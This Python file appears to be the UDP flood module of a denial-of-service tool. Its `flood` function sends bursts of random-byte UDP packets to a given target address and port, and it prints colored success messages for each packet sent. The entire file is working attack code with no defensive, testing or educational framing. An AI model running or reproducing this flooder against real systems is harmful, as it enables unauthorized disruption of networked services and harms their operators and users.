# Import modules
import random
import socket
from rich.console import Console

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"
blue = "dark_slate_gray2"

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def flood(target):
    for _ in range(16):
        try:
            payload = random._urandom(random.randint(1, 60))
            sock.sendto(payload, (target[0], target[1]))
        except Exception as e:
            print(
                f"[{red} bold][✘] ERROR[/{red} bold] "
                + f"[{yellow}]while sending UDP packet[/{yellow}]\n{e}"
            )
        else:
            print(
                f"[{green}][✔] SUCCESS'[/{green}] "
                + f"[{yellow}]UDP random packet sent! Payload size:[/{yellow}] "
                + f"[{blue}]{len(payload)}"
            )
